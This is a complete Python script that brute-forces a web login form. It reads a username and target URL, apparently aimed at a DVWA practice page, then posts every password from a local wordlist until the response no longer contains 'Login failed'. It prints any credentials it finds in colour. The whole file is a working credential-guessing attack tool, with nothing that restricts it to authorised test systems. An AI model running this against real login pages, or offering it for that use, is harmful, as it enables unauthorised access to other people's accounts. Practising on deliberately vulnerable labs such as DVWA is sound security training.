from colorama import Fore, Style
from multiprocessing import Process
import requests

target_url = input("[+] Enter the URL for the login (ex: \"http://192.168.7.120/dvwa/login.php\"): ")
username = input("[+] Enter Username For Specified Page: ")

def bruteforce(username, URL):
    for pwd in passwords:
        pwd = pwd.strip('\n')
        print(Fore.BLUE + f"[+] Trying Password {pwd} [+]" + Style.RESET_ALL)
        data_dictionary = {"username":username, "password":pwd, "Login":"submit"}
        response = requests.post(URL, data=data_dictionary)
        if b"Login failed" in response.content:
            pass
        else:
            print(Fore.GREEN + "---- [CREDENTIALS FOUND] ----" + Style.RESET_ALL)
            print(Fore.GREEN + f"[!] Username --> {username}" + Style.RESET_ALL)
            print(Fore.GREEN + f"[!] Password --> {pwd}" + Style.RESET_ALL)
            print(Fore.GREEN + "-----------------------------" + Style.RESET_ALL)
            exit()
    print(Fore.RED + "[-] Password Not Found in List [-]" + Style.RESET_ALL)

with open("wordlist", "r") as passwords:
    p = Process(target=bruteforce, args=(username, target_url))
    p.start()
    p.join()
    #bruteforce(username, target_url)

